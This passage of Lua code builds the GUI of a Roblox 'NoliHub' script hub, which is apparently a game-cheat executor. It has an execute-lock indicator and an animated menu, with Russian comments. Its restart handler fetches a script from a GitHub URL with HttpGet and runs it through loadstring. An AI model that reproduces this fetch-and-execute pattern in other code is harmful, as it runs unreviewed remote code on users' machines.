local function C_98()
local script = G2L["98"];
	if script.Parent.ExecuteLocked.Value == true then
		script.Parent.Execute.ImageColor3 = Color3.new(1, 0, 0)
		script.Parent.Execute.Interactable = false
	else
		script.Parent.Execute.ImageColor3 = Color3.new(1, 1, 1)
		script.Parent.Execute.Interactable = true
	end
end;
task.spawn(C_98);
-- StarterGui.NoliHub.MainFrame.Shadow.Restart.Restart.LocalScript
local function C_aa()
local script = G2L["aa"];
	local button = script.Parent
	
	local function leftClick()
	script.Parent.Text = "Производиться перезапуск..."
	wait(0.1)
	loadstring(game:HttpGet("https://raw.githubusercontent.com/nolimanom/Roblox-Scripts/refs/heads/main/NoliHub"))()
	wait(0.4)
	script.Parent.Parent.Parent.Parent.Parent:Destroy()
	end
	
	button.MouseButton1Click:Connect(leftClick)
end;
task.spawn(C_aa);
-- StarterGui.NoliHub.MainFrame.Shadow.Menu.Selector.LocalScript
local function C_b1()
local script = G2L["b1"];
	local TweenService = game:GetService("TweenService")
	
	local guiElement = script.Parent -- Предположим, что этот скрипт находится в самом GUI элементе
	local isMovedUp = false -- Переменная для отслеживания состояния (вверх/вниз)
	
	-- Функция для плавного перемещения GUI элемента
	local function moveGuiElement(units, direction, time, onComplete)
		local targetPosition
	
		if direction == "up" then
			targetPosition = guiElement.Position + UDim2.new(0, 0, -units / 100, 0)
		elseif direction == "down" then
			targetPosition = guiElement.Position + UDim2.new(0, 0, units / 100, 0)
		else
			warn("Invalid direction specified. Use 'up' or 'down'.")
			return
		end
	
		local tweenInfo = TweenInfo.new(
			time, -- Время анимации
			Enum.EasingStyle.Back, -- Стиль плавности
			Enum.EasingDirection.InOut, -- Направление анимации
			0, -- Повторение (0 = без повторения)
			false -- Обратная анимация
		)
	
		local tween = TweenService:Create(guiElement, tweenInfo, {Position = targetPosition})
	
		tween.Completed:Connect(function()
			if onComplete then
				onComplete()
			end
		end)
	
		tween:Play()
	end
	
	-- Функция, которая будет привязана к кнопке
	local function onButtonClicked()
		if isMovedUp then
			moveGuiElement(35, "down", 1, function()
				script.Parent.Button.Rotation = 0
				script.Parent.Parent.YeaAnotherShadow.Visible = false
				isMovedUp = false
			end)
		else
			moveGuiElement(35, "up", 1, function()
				script.Parent.Parent.YeaAnotherShadow.Visible = true
				script.Parent.Button.Rotation = 180
				isMovedUp = true
			end)
		end
	end
	
	-- Привязываем функцию к событию нажатия кнопки
	local button = script.Parent.Button -- Предположим, что кнопка находится на том же уровне и называется Button
	button.MouseButton1Click:Connect(onButtonClicked)
	
end;
task.spawn(C_b1);
-- StarterGui.NoliHub.MainFrame.Shadow.Menu.Selector.Home.LocalScript
